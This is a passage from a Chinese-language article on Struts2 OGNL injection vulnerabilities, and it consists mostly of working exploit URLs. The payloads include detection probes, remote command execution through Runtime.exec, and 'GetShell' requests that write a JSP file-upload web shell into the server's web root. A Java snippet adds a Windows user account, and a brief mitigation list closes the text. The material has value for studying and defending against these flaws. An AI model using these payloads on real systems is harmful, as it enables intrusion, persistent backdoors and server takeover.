http://localhost/Struts2/test.action?redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()}

```

**@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22)**其实是静态调用**ServletActionContext**上面已经讲过了ServletActionContext能够拿到真正的HttpServletRequest、HttpServletResponse、ServletContext忘记了的回头看去。**拿到一个HttpServletResponse响应对象后就可以调用getWriter方法(返回的是PrintWriter)让Servlet容器上输出[/ok]了，而其他的POC也都做了同样的事：拿到HttpServletResponse，然后输出[/ok]。**其中的allowStaticMethodAccess在Struts2里面默认是false，也就是默认不允许静态方法调用。

#### **精确判断是否存在（延迟判断）:**

POC1:

```
http://127.0.0.1/Struts2/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(5000)')(d)) 

```

POC2:

```
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000))%2b' 

```

POC3:

```
http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&z[%28foo%29%28%27meh%27%29]=true 

```

POC4：

```
http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(false)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&x[(class.classLoader.jarPath)('aa')] 

```

POC5：

```
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)} 

```

POC6:

```
http://127.0.0.1/Struts2/${%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)}.action

```

之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。

#### **命令执行：**

关于回显：webStr\75new\40byte[100] 修改为合适的长度。

POC1:

```
http://127.0.0.1/Struts2/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(h)(('\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%22))')(d))&(i)(('\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())')(d))&(i01)(('\43webStr\75new\40byte[100]')(d))&(i1)(('\43webRootzproreader.readFully(\43webStr)')(d))&(i111)('\43webStr12\75new\40java.lang.String(\43webStr)')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43webStr12)')(d))&(i99)(('\43xman.getWriter().close()')(d))&cmd=cmd%20/c%20ipconfig 

```

POC2:

```
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))%2b'&cmd=cmd%20/c%20ipconfig 

```

POC3:

```
http://127.0.0.1/freecms/login_login.do?user.loginname=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))&z[(user.loginname)('meh')]=true&cmd=cmd%20/c%20set

```

POC4:

```
http://127.0.0.1/Struts2/test.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().exec(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]&cmd=cmd%20/c%20netstat%20-an 

```

POC5：

```
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result),%23response.close()}&cmd=cmd%20/c%20set

```

POC6:

```
http://localhost/struts2-blank/example/HelloWorld.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}

```

其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式

```
java.lang.Runtime.getRuntime().exec("net user selina 123 /add");

```

就可以执行任意命令了。Exec执行后返回的类型是java.lang.Process。Process是一个抽象类，`final class ProcessImpl extends Process`也是Process的具体实现。而命令执行后返回的Process可以通过

```
public OutputStream getOutputStream()
public InputStream getInputStream()

```

直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执行dir之类的命令可以加上。

```
Process java.lang.Runtime.exec(String command) throws IOException

```

![2013072423412230696.png](http://drops.javaweb.org/uploads/images/49916ccd47d80de8473fc9711b4382c6f37306b6.jpg)

![2013072423413593661.png](http://drops.javaweb.org/uploads/images/e884515c09d83633d23da048071533dec8852b79.jpg)

#### **GetShell POC：**

poc1:

```
http://127.0.0.1/Struts2/test.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i12)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i13)(('\43xman.getWriter().println(\43req.getServletContext().getRealPath(%22\u005c%22))')(d))&(i2)(('\43fos\75new\40java.io.FileOutputStream(new\40java.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@java.io.File@separator).append(%22css3.jsp%22).toString())')(d))&(i3)(('\43fos.write(\43req.getParameter(%22p%22).getBytes())')(d))&(i4)(('\43fos.close()')(d))&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

```

POC2（类型转换漏洞需要把POC加在整型参数上）:

```
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())%2b'%20&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

```

POC3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:

```
http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(meh%29&z[%28foo%29%28%27meh%27%29]=true&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

```

POC4:

```
http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()(aa)&x[(class.classLoader.jarPath)('aa')]&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

```

POC5:

```
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()}&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

```

POC6:

```
http://localhost/Struts2/test.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e

```

比如POC4当中首先就是把allowStaticMethodAccess改为trute即允许静态方法访问。然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个css3.jsp，而css3.jsp的内容同样来自于客户端的请求。POC4中的p就是传入的参数，只要获取p就能获取到内容完成文件的写入了。之前已经说过**Java不是动态的脚本语言，所以没有eval。不能像PHP那样直接用eval去动态执行，所以Java里面没有真正意义上的一句话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，因为这些代码在有eval的情况下是可以通过发送请求的形式去构造的，在这里就必须把代码给上传到服务器去编译成执行。**

#### **Struts2:**

关于修补仅提供思路，具体的方法和补丁不提供了。Struts2默认后缀是action或者不写后缀，有的改过代码的可能其他后缀如.htm、.do，那么我们只要拦截这些请求进行过滤就行了。

```
1、  从CDN层可以拦截所有Struts2的请求过滤OGNL执行代码
2、  从Server层在请求Struts2之前拦截其Ognl执行。
3、  在项目层面可以在struts2的filter加一层拦截
4、  在Struts2可以用拦截器拦截
5、  在Ognl源码包可以拦截恶意的Ognl请求
6、  实在没办法就打补丁
7、  终极解决办法可以考虑使用其他MVC框架

```